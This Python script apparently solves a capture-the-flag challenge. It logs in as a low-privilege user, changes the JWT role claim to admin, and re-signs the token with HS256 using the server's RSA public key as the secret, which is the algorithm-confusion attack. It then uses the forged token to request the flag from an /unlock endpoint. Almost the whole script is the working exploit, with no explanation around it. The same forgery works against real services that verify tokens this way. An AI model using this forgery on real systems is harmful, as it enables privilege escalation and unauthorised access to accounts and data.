import requests
import json
import jwt
URL = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031'

### Get Access Token ##############################################
credentials = {
    "username":"minion",
    "password":"banana",
}
data = requests.post(URL+"/login", data=credentials)

stuff = json.loads(data.text)
try:
    accessToken = stuff["accessToken"]
    #print(accessToken)
except:
    print(data.text)

print(data.headers)
print(accessToken)
print()

#https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
### Deal with token ################################################

def processAccessToken(accessToken, debug=False):
    decodedToken = jwt.decode(accessToken, verify=False)
    decodedToken['role'] = 'admin'
    print(decodedToken)
    public = open('public.pem', 'r').read()
    encodedToken = jwt.encode(decodedToken, key=public, algorithm='HS256')
    return encodedToken.decode()
    
print()
    
token = processAccessToken(accessToken, debug=True)
### Get Flag #######################################################

#https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization
def getFlag(accessToken):
    headers = {"Authorization": "Bearer " + accessToken}
    data = requests.get(URL+"/unlock", headers=headers)#, data=credentials)
    print(data.text)

#token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3MTQ5MDEzfQ.0IO6EIEyp0AffHVjafYe7LSJT870ol0JmGhOhMF73kOMS7ri97pXvQgH2rg5gmY0cqLj6o2QTrRtH5p8ZVukUuDw0VjeckHxbHnoPXyvGVwZCDAFE-udy9X7d86Zd5ZCuPvr0u9PksNqv-YhwNcFGoUbqiQldQjpKx4RPW5oSsvNHRxs6_S-lYnJYwnk9jftdJejmYHKssKLJig9bayEGvwY3RcZLsF1JT-q_viRfkki0k-TcssU2epf7M7RLcNFHqBN1EeFUPcvj8q9FN0NApDWBTJwJVYJjxGXKAT0xlcHjT2Z7hs7oRmqz9H3oAmlYYLyyebIshsSghj39cba_-3BlOpxWvPVaO6e-jPx8hcPWSWygXmeShv5IffoFP_qzAPPwA9NGEdPxo2aICfwDJnkVgiGmo5LCcusVnTaxu10w09VecUGw4EFRNtMCCQBq-5J6DHM7k6cndINPDleQ2gpG7xb1TIjuUz92OagBc7CLLAw6r45V9AK-Mr4Dq5D2madIe3T1Goo84hpk7IfN_VCgIwlEL4CZCnzhw0Y4sWW8lzxRGXo10W6GEcsVGHZ1B5E19VIOsFgFytKHeVlr4IsMF4H9N1GFjDKs_auVFyG_18FMopiypidKgRLN7vsmenEqUDbGqVR4VxHeAL6xdTn51c3n4_T1GVKxlBEAwo"
#token = accessToken
getFlag(token)
getFlag(accessToken)
